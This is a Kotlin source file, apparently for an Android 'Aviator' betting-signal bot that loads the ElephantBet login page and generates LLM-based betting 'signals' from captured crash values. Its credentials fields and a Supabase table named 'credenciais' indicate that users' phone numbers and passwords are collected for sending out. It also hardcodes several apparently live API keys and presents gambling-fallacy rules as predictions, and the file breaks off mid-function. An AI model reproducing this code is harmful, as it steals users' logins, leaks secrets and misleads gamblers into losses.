package ao.elephantbet.aviatorbot

import android.annotation.SuppressLint
import android.app.AlertDialog
import android.app.DownloadManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.media.AudioAttributes
import android.media.SoundPool
import android.net.Uri
import android.net.http.SslError
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.animation.AlphaAnimation
import android.view.animation.Animation
import android.view.ViewGroup.LayoutParams.MATCH_PARENT as MATCH
import android.view.ViewGroup.LayoutParams.WRAP_CONTENT as WRAP
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.Calendar

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var barLayout: LinearLayout
    private lateinit var txtMinutos: TextView
    private lateinit var txtAcao: TextView
    private lateinit var txtProtecao: TextView
    private lateinit var txtAlcance: TextView
    private lateinit var dotView: View
    private lateinit var txtJanela: TextView  // linha ⏱ Entrar: min XX → XX
    private lateinit var txtAviso: TextView   // banner de aviso/alerta sempre visível
    private lateinit var txtRelogio: TextView // relógio fixo sempre visível (HH:MM)
    private var pulseRunnable: Runnable? = null

    private val handler = Handler(Looper.getMainLooper())
    private var relogioRunnable: Runnable? = null

    // Estado dos sinais
    private var sinaisAtivos = false
    private var horaAtual = -1
    private var ultimoMinutoGerado = -1
    private var sinalMin1 = -1
    private var sinalMin2 = -1
    private var sinalProtecao = ""
    private var sinalAlcMin = 0
    private var sinalAlcMax = ""
    private var sinalTendencia = ""
    private var sinalConfianca = 0
    private var sinalMinEntrada = -1   // minuto escolhido pela IA para entrar (ex: 17)
    private var sinalMinSaida  = -1   // fim da janela: sinalMinEntrada + 1 (calculado ao receber sinal)

    // Regras avançadas de estado
    private var houveMega200xRecente = false       // se saiu vela 200x+ → próximas 3-4 rosas uma será ≥70x
    private var rosasMega200xRestantes = 0         // contador regressivo de rosas após 200x
    private var ultimaRosaGrande = 0.0             // última rosa ≥10x vista
    private var rosasDesde200x = 0                 // rosas contadas após um 200x
    private var xadrezAlcanceActivo = false        // padrão xadrez de alcance detectado
    private var xadrezAlcanceAlto = true           // próxima rosa no xadrez de alcance é alta (≥20x)?
    private var ultimaRosaAlta = false             // última rosa foi ≥20x (para xadrez de alcance)
    private var rosasXadrezAlcance = mutableListOf<Double>() // últimas rosas para detectar xadrez
    private var semRosaGrandeUlt10min = false      // sem rosa ≥50x nos últimos 10 min da hora
    private var timestampUltimaRosa50x = 0L        // timestamp da última rosa ≥50x

    // Histórico real das velas capturadas dentro do jogo
    private val historicoVelas = mutableListOf<Double>()
    private var analisandoIA = false
    private var dentroDoAviator = false
    private var graficoPronto = false           // true só após 1.º crash ao vivo
    private var historicoJogoCarregado = false  // true quando JS enviou o histórico do gráfico
    private var countdown429Job: Runnable? = null
    private var iaTimeoutRunnable: Runnable? = null  // timeout de 50s da chamada à IA
    private var ultimaAnaliseMs = 0L          // timestamp da última análise
    private val COOLDOWN_IA_MS = 15_000L
    private var velasDesdeUltimaAnalise = 0

    // ── CICLO BASEADO NA JANELA ──────────────────────────────────
    // Após recolher 15 velas → 1.ª análise imediata
    // Sinal fica visível até o minuto sinalMinSaida terminar
    // Quando sinalMinSaida passa → pausa 30s → nova análise
    // Nunca por tempo fixo — sempre sincronizado com o relógio
    private var proximaAnaliseRunnable: Runnable? = null   // runnable agendado
    private var cicloAtivo = false                         // true quando aguarda fim da janela
    private var janelaJaDisparou = false                   // evita disparar 2x no mesmo minuto
    private var countdownCicloJob: Runnable? = null        // countdown visual em tempo real

    // Controlo do round actual (para capturar só o crash final)
    private var xAtual = 0.0
    private var emVoo = false
    private var ultimoCrash = 0.0
    private var ultimoCrashMs = 0L   // timestamp do último crash (evita duplicados por tempo)
    private var ultimoTickMs = 0L

    // Runnable nomeado para cancelar correctamente o timeout de crash
    private val crashTimeoutRunnable = Runnable {
        if (emVoo && xAtual >= 1.0) registarCrash(xAtual)
    }

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 1 — MODO SILENCIOSO DURANTE O VOO
    // Quando o multiplicador está a subir, nada deve ser feito.
    // ══════════════════════════════════════════════════════════════
    private var modoSilenciosoAtivo = false  // true enquanto o avião está em voo

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 2 — DETECÇÃO DE PADRÃO DE MINUTOS REPETIDOS
    // Conta quantas rosas ≥10x caíram em cada minuto do relógio.
    // ══════════════════════════════════════════════════════════════
    private val contagemMinutos = IntArray(60) { 0 }  // minuto → contagem de rosas grandes

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 3 — CACHE DO PROMPT DA IA
    // Evita chamar a IA se entraram <3 velas novas desde a última análise.
    // ══════════════════════════════════════════════════════════════
    private var cacheResultadoIA: String? = null
    private var cacheNumVelas: Int = 0
    private var cacheTimestampMs: Long = 0L
    private val CACHE_MIN_VELAS_NOVAS = 3
    private val CACHE_MAX_IDADE_MS = 60_000L  // 60 segundos

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 4 — NOTIFICAÇÃO SONORA + VIBRAÇÃO NO SINAL
    // ══════════════════════════════════════════════════════════════
    private var soundPool: SoundPool? = null
    private var soundIdSinal: Int = 0
    private var soundCarregado = false

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 5 — MODO CONSERVADOR AUTOMÁTICO
    // Se >60% das últimas 10 velas forem azuis (<2x) → modo conservador.
    // ══════════════════════════════════════════════════════════════
    private var modoConservadorAtivo = false
    private val JANELA_CONSERVADOR = 10
    private val LIMIAR_AZUIS_CONSERVADOR = 0.60f

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 6 — HISTÓRICO DE SINAIS COM COMPARAÇÃO REAL
    // Guarda os últimos 10 sinais e compara com crashes reais.
    // ══════════════════════════════════════════════════════════════
    private val historicoSinais = mutableListOf<SinalRegistado>()
    private var sinalPendenteComparacao: SinalRegistado? = null

    data class SinalRegistado(
        val timestampMs: Long,
        val protecao: Double,
        val alcanceMin: Int,
        val alcanceMax: Int,
        val confianca: Int,
        var crashReal: Double? = null,
        var protecaoOk: Boolean? = null,
        var alcanceOk: Boolean? = null
    ) {
        val emoji: String get() = when {
            crashReal == null -> "⏳"
            alcanceOk == true -> "✅"
            protecaoOk == true -> "🟡"
            else -> "❌"
        }
    }

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 8 — MODO OFFLINE / SEM IA
    // Quando IA falha, usa regras locais para gerar sinal básico.
    // ══════════════════════════════════════════════════════════════
    private var consecutivosFalhosIA = 0
    private val MAX_FALHOS_ANTES_OFFLINE = 2
    // Retry automático: após entrar em offline, tentar a IA de novo com backoff
    private var retryIaJob: Runnable? = null
    private var retryIaIntervalMs = 60_000L   // começa em 60s, duplica até 5 min

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 9 — REINÍCIO AUTOMÁTICO APÓS CRASH DO APP
    // Guarda e restaura o último sinal activo em SharedPreferences.
    // ══════════════════════════════════════════════════════════════
    private val PREFS_ESTADO = "skybot_estado"
    private val PREFS_SINAL_JSON = "ultimo_sinal_json"
    private val PREFS_CONSERVADOR = "modo_conservador"
    private val PREFS_VELAS_COUNT = "num_velas"

    // Configuração do histórico
    private val MIN_VELAS_ANALISE = 8     // mínimo para pedir sinal à IA (histórico DOM garante arranque rápido)
    private val MAX_VELAS_LOCAL = 30      // máximo em memória local
    private val MAX_VELAS_SUPABASE = 100  // limite máximo no Supabase
    private val VELAS_A_APAGAR = 50       // apagar as 50 mais antigas ao atingir o limite
    private var totalVelasSupabase = 0    // contador estimado (actualizado ao carregar)
    private var limpezaEmCurso = false    // evitar limpezas simultâneas

    private fun registarCrash(crashVal: Double) {
        if (!emVoo) return
        emVoo = false
        modoSilenciosoAtivo = false  // M1: fim do voo, reactivar bot

        // CORRECÇÃO CRÍTICA: usar o maior entre crashVal (DOM/WS texto) e xAtual (WS binário)
        val valorFinal = if (crashVal >= xAtual && crashVal >= 1.0) crashVal else xAtual
        xAtual = 0.0
        handler.removeCallbacks(crashTimeoutRunnable)

        // Evitar duplicados e valores inválidos (mínimo 3s entre crashes)
        val agora = System.currentTimeMillis()
        if (valorFinal < 1.0 || (valorFinal == ultimoCrash && agora - ultimoCrashMs < 3000)) return
        ultimoCrash = valorFinal
        ultimoCrashMs = agora

        // Guardar no histórico local (máx 30)
        historicoVelas.add(valorFinal)
        if (historicoVelas.size > MAX_VELAS_LOCAL) historicoVelas.removeAt(0)

        // ── M2: REGISTO DE PADRÃO DE MINUTOS ──────────────────────────────
        if (valorFinal >= 10.0) {
            val minCrash = Calendar.getInstance().get(Calendar.MINUTE)
            contagemMinutos[minCrash]++
        }

        // ── M5: AVALIAR MODO CONSERVADOR AUTOMÁTICO ────────────────────────
        avaliarModoConservador()

        // ── M6: COMPARAR SINAL PENDENTE COM CRASH REAL ────────────────────
        sinalPendenteComparacao?.let { sinal ->
            if (sinal.crashReal == null) {
                sinal.crashReal = valorFinal
                sinal.protecaoOk = valorFinal >= sinal.protecao
                sinal.alcanceOk = valorFinal >= sinal.alcanceMin
                // Actualizar estatísticas de sinais na UI
                handler.post { actualizarEstatisticasSinais() }
            }
            sinalPendenteComparacao = null
        }

        // ── M9: LIMPAR SINAL GUARDADO (crash terminou, sinal já não é válido) ──
        getSharedPreferences(PREFS_ESTADO, Context.MODE_PRIVATE)
            .edit().remove(PREFS_SINAL_JSON).apply()

        // ── M3: INVALIDAR CACHE DA IA (novo crash = nova análise necessária) ──
        cacheResultadoIA = null
        // ── REGRA 200x+: se saiu uma vela ≥200x, nas próximas 3-4 rosas uma será ≥70x ──
        if (valorFinal >= 200.0) {
            houveMega200xRecente = true
            rosasMega200xRestantes = 4
            rosasDesde200x = 0
        }
        // Contagem de rosas após 200x
        if (houveMega200xRecente && valorFinal >= 10.0) {
            rosasDesde200x++
            if (valorFinal >= 70.0 || rosasDesde200x >= 4) {
                houveMega200xRecente = false
                rosasMega200xRestantes = 0
            } else {
                rosasMega200xRestantes = 4 - rosasDesde200x
            }
        }

        // ── REGRA XADREZ DE ALCANCE: rosas alternando ≥20x / <20x ──
        if (valorFinal >= 10.0) {
            ultimaRosaGrande = valorFinal
            rosasXadrezAlcance.add(valorFinal)
            if (rosasXadrezAlcance.size > 6) rosasXadrezAlcance.removeAt(0)
            // Detectar padrão alternado: ≥20x, <20x, ≥20x, <20x
            if (rosasXadrezAlcance.size >= 4) {
                val ultimas4 = rosasXadrezAlcance.takeLast(4)
                val alt1 = ultimas4[0] >= 20.0 && ultimas4[1] < 20.0 && ultimas4[2] >= 20.0 && ultimas4[3] < 20.0
                val alt2 = ultimas4[0] < 20.0 && ultimas4[1] >= 20.0 && ultimas4[2] < 20.0 && ultimas4[3] >= 20.0
                xadrezAlcanceActivo = alt1 || alt2
                if (xadrezAlcanceActivo) {
                    xadrezAlcanceAlto = ultimas4.last() < 20.0
                    // Mostrar histórico das últimas rosas com emoji de cor
                    val emojisXadrez = rosasXadrezAlcance.joinToString(" ") { v ->
                        when {
                            v >= 50.0 -> "🟣"   // mega
                            v >= 20.0 -> "🩷"   // rosa grande
                            else      -> "🔵"   // rosa pequena
                        }
                    }
                    runOnUiThread { /* xadrez detectado */ }
                }
            }
            // Rastrear rosa ≥50x para regra dos últimos 10 min da hora
            if (valorFinal >= 50.0) {
                timestampUltimaRosa50x = System.currentTimeMillis()
                semRosaGrandeUlt10min = false
            }
        }

        // ── REGRA ÚLTIMOS 10 MIN DA HORA ──
        val calAgora = Calendar.getInstance()
        val minutoAgora = calAgora.get(Calendar.MINUTE)
        if (minutoAgora >= 50) {
            val minDesdeUltimaRosa50 = if (timestampUltimaRosa50x > 0L)
                (System.currentTimeMillis() - timestampUltimaRosa50x) / 60000 else 999L
            semRosaGrandeUlt10min = minDesdeUltimaRosa50 >= 10
        } else if (minutoAgora < 5) {
            semRosaGrandeUlt10min = false
        }

        // Guardar no Supabase (só o crash final, nunca ticks)
        totalVelasSupabase++
        enviarVelaSupabase(valorFinal)

        // Quando atinge 100 velas, apagar as 50 mais antigas (uma única limpeza de cada vez)
        if (totalVelasSupabase >= MAX_VELAS_SUPABASE && !limpezaEmCurso) {
            limpezaEmCurso = true
            limparVelasAntigas()
        }

        val n = historicoVelas.size

        // Cor da vela para o display
        val corCrash = when {
            valorFinal >= 50.0 -> "#f0abfc"  // mega (lilás brilhante)
            valorFinal >= 10.0 -> "#ec4899"  // rosa
            valorFinal >= 2.0  -> "#a855f7"  // roxa
            else               -> "#3b82f6"  // azul
        }

        // ═════════════════════════════════════════════════════════════════════════
        // ✅ RESTAURAR VISIBILIDADE E ANIMAÇÕES APÓS O VOO
        // ═════════════════════════════════════════════════════════════════════════
        runOnUiThread {
            // 1 — Restaurar relógio
            txtRelogio.visibility = View.VISIBLE
            txtRelogio.alpha = 1f
            txtRelogio.clearAnimation()
            
            // 2 — Limpar multiplicador
            txtMinutos.text = ""
            txtMinutos.visibility = View.GONE
            txtMinutos.alpha = 1f
            txtMinutos.clearAnimation()
            
            // 3 — Restaurar tendência (txtAcao)
            txtAcao.visibility = View.VISIBLE
            txtAcao.alpha = 1f
            txtAcao.clearAnimation()
            txtAcao.animate().cancel()
            
            // 4 — Restaurar protecção com animação suave
            if (::txtProtecao.isInitialized) {
                txtProtecao.alpha = 1f
                txtProtecao.clearAnimation()
                txtProtecao.animate().cancel()
                txtProtecao.animate()
                    .alpha(1f).setDuration(300).start()
            }
            
            // 5 — Restaurar alcance com animação suave de scale
            if (::txtAlcance.isInitialized) {
                txtAlcance.alpha = 1f
                txtAlcance.clearAnimation()
                txtAlcance.animate().cancel()
                txtAlcance.animate()
                    .scaleX(1.08f).scaleY(1.08f).setDuration(180)
                    .withEndAction {
                        txtAlcance.animate()
                            .scaleX(1f).scaleY(1f).setDuration(180).start()
                    }.start()
            }
            
            // 6 — Restaurar janela
            if (::txtJanela.isInitialized) {
                txtJanela.alpha = 1f
                txtJanela.clearAnimation()
                txtJanela.animate().cancel()
            }
        }

        // Se já há sinal activo, restaurar o sinal em vez de mostrar "CRASH x.xx"
        if (sinaisAtivos && sinalProtecao.isNotEmpty()) {
            val cal2 = Calendar.getInstance()
            val minAgora2 = cal2.get(Calendar.MINUTE)
            mostrarSinalCompleto(sinalProtecao, "${sinalAlcMin}x → $sinalAlcMax", sinalTendencia, sinalConfianca,
                when {
                    (sinalAlcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0) >= 100 -> "#ec4899"
                    (sinalAlcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0) >= 20  -> "#22c55e"
                    (sinalAlcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0) >= 5   -> "#f59e0b"
                    else -> "#3b82f6"
                }, minAgora2)
        } else {
            setBarra("CRASH ${String.format("%.2f", valorFinal)}x",
                if (n < MIN_VELAS_ANALISE) "$n/${MIN_VELAS_ANALISE} velas recolhidas"
                else "$n velas capturadas",
                corCrash)
        }

        velasDesdeUltimaAnalise++

        // Actualizar banner de avisos/alertas após cada vela
        atualizarAviso()

        // ── FASE 1: RECOLHA ──────────────────────────────────────────
        // Enquanto não tiver 15 velas, só mostra progresso. NUNCA chama a IA.
        if (n < MIN_VELAS_ANALISE) {
            handler.postDelayed({
                setBarra("⏳ A RECOLHER DADOS",
                    "$n/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
            }, 800)
            return
        }

        // ── FASE 2: 1.ª ANÁLISE — só aqui a análise começa (1.º crash após ter velas suficientes) ──
        if (!graficoPronto) {
            graficoPronto = true
            contarVelasSupabase()  // gestão do limite Supabase em background
            if (!analisandoIA && !cicloAtivo) {
                setBarra("🔍 IA A ANALISAR...", "${historicoVelas.size} velas prontas", "#7c3aed")
                // Aguardar 4s para garantir que o voo seguinte não começou ainda
                // e que modoSilenciosoAtivo está false
                handler.postDelayed({
                    modoSilenciosoAtivo = false  // forçar desactivação para análise inicial
                    invalidarCache()             // forçar chamada real à IA
                    pedirSinalIA()
                }, 4_000)
            }
            return
        }

        // ── FASE 3: CICLO EM CURSO ───────────────────────────────────
        // O countdown de 60s está a correr e dispara sozinho. Nada a fazer aqui.
    }

    // ── GESTÃO DE BANCA ───────────────────────────────────────────
    private var bancaInicial = 0.0
    private var bancaAtual   = 0.0
    private var apostaPorRonda = 0.0
    private val MAX_RISCO_PORCENTO = 2.0

    // ── TRACKING DE RESULTADOS ────────────────────────────────────
    private var totalApostas  = 0
    private var totalGanhos   = 0
    private var totalPerdas   = 0
    private var lucroLiquido  = 0.0
    private var sequenciaPerdas = 0
    private var maxSequenciaPerdas = 0
    private var timestampInicioSessao = 0L
    private var stopLossAtivo = false
    private var takeProfitAtivo = false
    private val STOP_LOSS_PORCENTO  = 20.0
    private val TAKE_PROFIT_PORCENTO = 30.0
    private val PREFS = "skybot_prefs"

    // Credenciais
    private var ultimoNumeroEnviado = ""
    private var ultimaSenhaEnviada = ""
    private var numeroTemporario = ""   // guarda número até ter senha para enviar junto
    private var sessaoId: Int = -1      // id da linha inserida no Supabase para esta sessão
    private var credPollerRunnable: Runnable? = null  // poller activo — evita duplicados
    private var credUltimoNum = ""                     // estado partilhado do poller
    private var credUltimaSen = ""                     // estado partilhado do poller

    private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
    private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
    private val TABELA = "credenciais"
    private val VERSAO_ATUAL = "3.4"

    // OpenRouter — 1.º provedor principal (chave 1 e chave 2 fallback)
    private val OR_KEY   = "sk-or-v1-cbdb43d2442f14b7" + "00691bb6e4cf3493fcc0fe0c5ee3d4dbd0d2a0ac4cf201ea"
    private val OR_KEY2  = "sk-or-v1-70a304f730588f" + "f698142c732ca6ee959b5e19109f24a5cf4d789428a2efa258"
    private val OR_URL   = "https://openrouter.ai/api/v1/chat/completions"
    private val OR_MODEL = "meta-llama/llama-3-70b-instruct"
    // Gemini — 2.º provedor (fallback do OpenRouter)
    private val GEMINI_KEY = "AQ.Ab8RN6Jsh1_nlhSWbz-IkqmShs4AP" + "Fci-Sp6jp4WGafDjNjx8Q"
    private val GEMINI_URL get() = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=$GEMINI_KEY"
    // DeepSeek — 3.º provedor (fallback final)
    private val DS_KEY   = "sk-b9723cbde9734b54baa5addd5d773e24"
    private val DS_URL   = "https://api.deepseek.com/v1/chat/completions"
    private val DS_MODEL = "deepseek-chat"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        construirUI()
        carregarPrefs()
        timestampInicioSessao = System.currentTimeMillis()

        // M4 — Inicializar SoundPool para alertas sonoros
        inicializarSom()

        // M9 — Restaurar estado após kill do processo
        restaurarEstado()

        webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login")
        handler.postDelayed({ verificarAtualizacao() }, 3000)

        // Mostrar tutorial sempre ao abrir o app
        handler.postDelayed({ mostrarTutorial() }, 800)
    }

    // ── UI ────────────────────────────────────────────────────────
    private fun construirUI() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0a0a0f"))
            layoutParams = ViewGroup.LayoutParams(MATCH, MATCH)
        }
        setContentView(root)

        // ══════════════════════════════════════════════════════════
        // BARRA PRINCIPAL — design profissional
        // ══════════════════════════════════════════════════════════
        barLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0a0f1e"))
            setPadding(dp(14), dp(10), dp(14), dp(12))
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }

        // ── Linha topo: RelativeLayout para posições fixas sem sobreposição ──
        // Hora fixada no canto esquerdo | Tendência centrada | Engrenagem no canto direito
        val linhaTop = android.widget.RelativeLayout(this).apply {
            layoutParams = LinearLayout.LayoutParams(MATCH, dp(36))
        }
        // Relógio — canto superior esquerdo, SEMPRE visível
        txtRelogio = TextView(this).apply {
            id = android.view.View.generateViewId()
            text = "--:--"; textSize = 13f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#94a3b8")); isSingleLine = true
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = android.widget.RelativeLayout.LayoutParams(WRAP, MATCH).apply {
                addRule(android.widget.RelativeLayout.ALIGN_PARENT_START)
                addRule(android.widget.RelativeLayout.CENTER_VERTICAL)
                marginStart = dp(2)
            }
        }
        // Multiplicador em voo — SUBSTITUI o relógio (mesmo espaço, sem sobreposição)
        txtMinutos = TextView(this).apply {
            id = android.view.View.generateViewId()
            text = ""; textSize = 14f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#f59e0b")); isSingleLine = true
            gravity = Gravity.CENTER_VERTICAL or Gravity.CENTER_HORIZONTAL
            layoutParams = android.widget.RelativeLayout.LayoutParams(dp(70), MATCH).apply {
                addRule(android.widget.RelativeLayout.ALIGN_PARENT_START)
                addRule(android.widget.RelativeLayout.CENTER_VERTICAL)
                marginStart = dp(2)
            }
        }
        // Tendência + confiança — centrado horizontalmente
        txtAcao = TextView(this).apply {
            id = android.view.View.generateViewId()
            text = ""; textSize = 12f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); letterSpacing = 0.04f
            gravity = Gravity.CENTER; isSingleLine = true
            layoutParams = android.widget.RelativeLayout.LayoutParams(WRAP, MATCH).apply {
                addRule(android.widget.RelativeLayout.CENTER_IN_PARENT)
            }
        }
        // Dot pulsante — à esquerda do ⚙️
        dotView = View(this).apply {
            id = android.view.View.generateViewId()
            layoutParams = android.widget.RelativeLayout.LayoutParams(dp(9), dp(9)).apply {
                addRule(android.widget.RelativeLayout.ALIGN_PARENT_END)
                addRule(android.widget.RelativeLayout.CENTER_VERTICAL)
                marginEnd = dp(36)
            }
            background = circulo("#334155")
        }
        // Engrenagem — fixada no canto superior direito, nunca se move
        val cfgBtn = TextView(this).apply {
            id = android.view.View.generateViewId()
            text = "⚙️"; textSize = 19f; gravity = Gravity.CENTER
            layoutParams = android.widget.RelativeLayout.LayoutParams(dp(32), MATCH).apply {
                addRule(android.widget.RelativeLayout.ALIGN_PARENT_END)
                addRule(android.widget.RelativeLayout.CENTER_VERTICAL)
            }
            setOnClickListener { mostrarConfig() }
        }
        linhaTop.addView(txtRelogio)
        linhaTop.addView(txtMinutos)
        linhaTop.addView(txtAcao)
        linhaTop.addView(dotView)
        linhaTop.addView(cfgBtn)

        // ── Divisor fino ──────────────────────────────────────────
        val divisor = View(this).apply {
            setBackgroundColor(Color.parseColor("#1e293b"))
            layoutParams = LinearLayout.LayoutParams(MATCH, dp(1)).apply { topMargin = dp(8) }
        }

        // ── Linha meio: 🛡 SAÍDA  ›  🎯 ALCANCE ─────────────────
        // Labels pequenos por cima
        val linhaLabels = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(10) }
        }
        val lblProt = TextView(this).apply {
            text = "SAÍDA SEGURA"; textSize = 9f; letterSpacing = 0.10f
            setTextColor(Color.parseColor("#475569")); gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
        }
        val lblAlc = TextView(this).apply {
            text = "OBJECTIVO"; textSize = 9f; letterSpacing = 0.10f
            setTextColor(Color.parseColor("#475569")); gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
        }
        linhaLabels.addView(lblProt); linhaLabels.addView(lblAlc)

        // Valores grandes
        val linhaMeio = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(4) }
        }
        txtProtecao = TextView(this).apply {
            text = "--"; textSize = 26f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#94a3b8")); gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
        }
        val sep = TextView(this).apply {
            text = "›"; textSize = 20f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#334155")); gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply {
                marginStart = dp(8); marginEnd = dp(8)
            }
        }
        txtAlcance = TextView(this).apply {
            text = "--"; textSize = 20f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#94a3b8")); gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
        }
        linhaMeio.addView(txtProtecao); linhaMeio.addView(sep); linhaMeio.addView(txtAlcance)

        // ── Linha janela: ⏱ Entrar: min XX → XX ─────────────────
        txtJanela = TextView(this).apply {
            text = ""; textSize = 13f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#38bdf8")); gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, dp(2))
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
            visibility = View.GONE
        }

        // ── Banner de aviso/alerta (comboio, pós-mega, xadrez, fim hora) ──
        txtAviso = TextView(this).apply {
            text = ""; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            setPadding(dp(10), dp(5), dp(10), dp(5))
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(4) }
            visibility = View.GONE
        }

        barLayout.addView(linhaTop)
        barLayout.addView(divisor)
        barLayout.addView(linhaLabels)
        barLayout.addView(linhaMeio)
        barLayout.addView(txtJanela)
        barLayout.addView(txtAviso)
        root.addView(barLayout)

        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(MATCH, 0, 1f)
        }
        configurarWebView()
        root.addView(webView)
    }

    // ── WEBVIEW ───────────────────────────────────────────────────
    @SuppressLint("SetJavaScriptEnabled")
    private fun configurarWebView() {
        webView.settings.apply {
            javaScriptEnabled = true; domStorageEnabled = true
            databaseEnabled = true; allowFileAccess = true
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            setSupportZoom(true); builtInZoomControls = false
            loadWithOverviewMode = true; useWideViewPort = true
        }

        webView.addJavascriptInterface(object {

            @JavascriptInterface
            fun aviatorAberto() = runOnUiThread {
                if (!dentroDoAviator) {
                    dentroDoAviator = true
                    graficoPronto = false
                    historicoJogoCarregado = false
                    historicoVelas.clear()
                    sinaisAtivos = false
                    sinalProtecao = ""
                    sinalMinEntrada = -1
                    sinalMinSaida   = -1
                    cicloAtivo = false
                    janelaJaDisparou = false
                    proximaAnaliseRunnable?.let { handler.removeCallbacks(it) }
                    countdownCicloJob?.let { handler.removeCallbacks(it) }; countdownCicloJob = null
                    emVoo = false; xAtual = 0.0; ultimoCrash = 0.0; analisandoIA = false
                    // Iniciar relógio imediatamente para mostrar hora desde o início
                    if (relogioRunnable == null) iniciarRelogio()
                    setBarra("⏳ AGUARDAR CRASH", "Aviator aberto · aguardar 1.º crash...", "#475569")
                    // Tentar ler histórico DOM em background (dados para análise futura)
                    // mas NUNCA disparar pedirSinalIA() a partir daqui
                    handler.postDelayed({
                        if (!historicoJogoCarregado && dentroDoAviator) {
                            // DOM não respondeu — ok, aguardar crashes ao vivo
                            setBarra("⏳ AGUARDAR CRASH", "A recolher velas ao vivo...", "#475569")
                        }
                    }, 12_000)
                }
            }

            @JavascriptInterface
            fun velaCapturada(valor: String) {
                val num = valor.toDoubleOrNull() ?: return
                if (num < 1.0 || num > 200000.0) return
                val agora = System.currentTimeMillis()
                runOnUiThread {
                    handler.removeCallbacks(crashTimeoutRunnable)

                    if (!emVoo) {
                        emVoo = true
                        xAtual = num
                        ultimoTickMs = agora
                        modoSilenciosoAtivo = true  // M1: silêncio durante o voo
                        mostrarEmVoo(num)
                    } else {
                        if (num >= xAtual) {
                            xAtual = num
                            ultimoTickMs = agora
                            mostrarEmVoo(num)
                        }
                    }

                    val timeoutMs = when {
                        xAtual >= 100.0 -> 60000L
                        xAtual >= 20.0  -> 40000L
                        xAtual >= 5.0   -> 20000L
                        else            -> 10000L
                    }
                    handler.postDelayed(crashTimeoutRunnable, timeoutMs)
                }
            }

            @JavascriptInterface
            fun crashDetectado(valor: String) {
                val num = valor.toDoubleOrNull() ?: return
                if (num < 1.0 || num > 200000.0) return
                runOnUiThread {
                    handler.removeCallbacks(crashTimeoutRunnable)
                    if (!emVoo) emVoo = true
                    registarCrash(num)
                }
            }

            // Histórico do DOM recebido — carregar imediatamente para análise rápida
            @JavascriptInterface
            fun velasHistoricoRecebidas(json: String) = runOnUiThread {
                if (!dentroDoAviator) return@runOnUiThread
                if (historicoJogoCarregado) return@runOnUiThread  // já carregado, ignorar duplicados

                // Extrair números do JSON simples: [1.23,4.56,...]
